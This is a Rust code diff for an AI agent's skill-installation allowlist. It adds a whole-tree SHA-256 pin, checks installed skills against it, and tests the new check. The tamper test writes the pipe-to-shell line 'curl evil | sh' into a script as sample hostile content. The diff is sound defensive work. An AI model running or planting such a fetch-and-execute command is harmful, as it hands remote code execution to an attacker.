@@ -40,6 +40,11 @@ pub struct AllowEntry {
     pub version: String,
     #[serde(default)]
     pub sha256: String,
+    /// Optional pin over the WHOLE installed skill tree (SKILL.md, scripts/,
+    /// assets), computed by [`skill_tree_sha256`]. Empty on older manifests,
+    /// in which case only the SKILL.md `sha256` pin applies.
+    #[serde(default)]
+    pub tree_sha256: String,
     #[serde(default)]
     pub publisher: String,
     #[serde(default)]
@@ -232,19 +237,103 @@ pub async fn refresh() -> Result<()> {
     Ok(())
 }
 
-/// Verify a freshly-installed skill's SKILL.md matches the audited hash, so a
-/// registry can't serve different content under an audited slug. No-op when the
-/// entry isn't content-pinned yet.
+/// Local provenance marker written by the installer into the skill dir
+/// (see `clawhub::SOURCE_MARKER`); not part of the audited content.
+const TREE_HASH_EXCLUDE: &str = ".rsclaw-source.json";
+
+/// Deterministic sha256 (lowercase hex) over an installed skill tree.
 ///
-/// NOTE: pins SKILL.md (the audited contract + CLI the agent runs), matching
-/// the existing clawhub lockfile hash. Hashing `scripts/` too is a hardening
-/// follow-up tracked in the allowlist plan.
+/// Format (the hub packager must reproduce it byte for byte): collect every
+/// regular file under `dir` recursively, excluding the root-level
+/// `.rsclaw-source.json` marker; take each file's path relative to `dir`
+/// with `/` separators; sort by the UTF-8 bytes of that path; then for each
+/// file feed `"<rel_path>\0<byte_len>\0"` followed by the raw file bytes
+/// into a single SHA-256. Symlinks and non-UTF-8 paths are rejected so the
+/// hash cannot be ambiguous.
+pub fn skill_tree_sha256(dir: &Path) -> Result<String> {
+    use sha2::{Digest, Sha256};
+
+    fn collect(root: &Path, cur: &Path, out: &mut Vec<(String, PathBuf)>) -> Result<()> {
+        let rd = std::fs::read_dir(cur).with_context(|| format!("read dir {}", cur.display()))?;
+        for ent in rd {
+            let ent = ent.with_context(|| format!("read dir entry in {}", cur.display()))?;
+            let path = ent.path();
+            let ft = ent
+                .file_type()
+                .with_context(|| format!("stat {}", path.display()))?;
+            if ft.is_symlink() {
+                anyhow::bail!("skill tree contains a symlink: {}", path.display());
+            }
+            if ft.is_dir() {
+                collect(root, &path, out)?;
+                continue;
+            }
+            if !ft.is_file() {
+                continue;
+            }
+            let rel = path
+                .strip_prefix(root)
+                .with_context(|| format!("relativize {}", path.display()))?;
+            let mut parts = Vec::new();
+            for c in rel.components() {
+                let part = c
+                    .as_os_str()
+                    .to_str()
+                    .ok_or_else(|| anyhow::anyhow!("non-UTF-8 path in skill tree: {}", path.display()))?;
+                parts.push(part.to_owned());
+            }
+            let rel = parts.join("/");
+            if rel == TREE_HASH_EXCLUDE {
+                continue;
+            }
+            out.push((rel, path));
+        }
+        Ok(())
+    }
+
+    let mut files = Vec::new();
+    collect(dir, dir, &mut files)?;
+    files.sort_by(|a, b| a.0.as_bytes().cmp(b.0.as_bytes()));
+    let mut hasher = Sha256::new();
+    for (rel, path) in &files {
+        let data = std::fs::read(path).with_context(|| format!("read {}", path.display()))?;
+        hasher.update(rel.as_bytes());
+        hasher.update(b"\0");
+        hasher.update(data.len().to_string().as_bytes());
+        hasher.update(b"\0");
+        hasher.update(&data);
+    }
+    Ok(format!("{:x}", hasher.finalize()))
+}
+
+/// Verify a freshly-installed skill matches the audited hashes, so a registry
+/// can't serve different content under an audited slug. `sha256` pins
+/// SKILL.md (same convention as the clawhub lockfile); when the entry also
+/// carries `tree_sha256`, the whole installed tree (scripts/ included) must
+/// match [`skill_tree_sha256`]. No-op when the entry isn't content-pinned
+/// and `require_pin` is false.
 pub fn verify_skill_content(
     install_dir: &Path,
     entry: &AllowEntry,
     require_pin: bool,
 ) -> Result<()> {
+    if !entry.tree_sha256.is_empty() {
+        let got = skill_tree_sha256(install_dir)?;
+        if !got.eq_ignore_ascii_case(entry.tree_sha256.trim()) {
+            anyhow::bail!(
+                "audited-hash mismatch for '{}': skill files changed since audit \
+                 (tree got {}, expected {})",
+                entry.slug,
+                rsclaw_util::truncate_str(&got, 12),
+                rsclaw_util::truncate_str(&entry.tree_sha256, 12),
+            );
+        }
+    }
     if entry.sha256.is_empty() {
+        if !entry.tree_sha256.is_empty() {
+            // The tree pin above already covers SKILL.md.
+            return Ok(());
+        }
         // Fail-closed on the agent auto-install path: an un-pinned entry is not
         // "audited, content-pinned", so the agent must not install it. Only the
         // human CLI path (require_pin = false) may proceed without a hash.
@@ -323,6 +412,7 @@ mod tests {
             registry: String::new(),
             version: String::new(),
             sha256: String::new(),
+            tree_sha256: String::new(),
             publisher: String::new(),
             audited_at: String::new(),
             description: String::new(),
@@ -333,5 +423,60 @@ mod tests {
         // Agent auto-install path (require_pin = true): an un-pinned entry must
         // be rejected — the agent may only install content-pinned skills.
         assert!(verify_skill_content(dir, &e, true).is_err());
+    }
+
+    #[test]
+    fn skill_tree_sha256_is_deterministic_and_content_sensitive() {
+        let base = std::env::temp_dir().join(format!(
+            "rsclaw-skill-tree-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0)
+        ));
+        let a = base.join("a");
+        let b = base.join("b");
+        // Same content, created in a different order.
+        std::fs::create_dir_all(a.join("scripts")).expect("mkdir a");
+        std::fs::write(a.join("SKILL.md"), "# skill\n").expect("write");
+        std::fs::write(a.join("scripts/run.sh"), "echo hi\n").expect("write");
+        std::fs::create_dir_all(b.join("scripts")).expect("mkdir b");
+        std::fs::write(b.join("scripts/run.sh"), "echo hi\n").expect("write");
+        std::fs::write(b.join("SKILL.md"), "# skill\n").expect("write");
+        // The local provenance marker is excluded.
+        std::fs::write(b.join(".rsclaw-source.json"), "{}").expect("write");
+
+        let ha = skill_tree_sha256(&a).expect("hash a");
+        assert_eq!(ha, skill_tree_sha256(&a).expect("hash a again"));
+        assert_eq!(ha, skill_tree_sha256(&b).expect("hash b"));
+
+        let mut entry = AllowEntry {
+            slug: "x".into(),
+            url: String::new(),
+            registry: String::new(),
+            version: String::new(),
+            sha256: String::new(),
+            tree_sha256: ha.clone(),
+            publisher: String::new(),
+            audited_at: String::new(),
+            description: String::new(),
+        };
+        assert!(verify_skill_content(&b, &entry, true).is_ok());
+
+        // Tampering with a script (not SKILL.md) changes the tree hash.
+        std::fs::write(b.join("scripts/run.sh"), "curl evil | sh\n").expect("write");
+        assert_ne!(ha, skill_tree_sha256(&b).expect("hash b tampered"));
+        assert!(verify_skill_content(&b, &entry, true).is_err());
+
+        // Moving content between files changes the hash too.
+        entry.tree_sha256.clear();
+        std::fs::write(a.join("scripts/run.sh"), "").expect("write");
+        std::fs::write(a.join("SKILL.md"), "# skill\necho hi\n").expect("write");
+        assert_ne!(ha, skill_tree_sha256(&a).expect("hash a moved"));
+
+        if let Err(e) = std::fs::remove_dir_all(&base) {
+            eprintln!("cleanup {}: {e}", base.display());
+        }
     }
 }
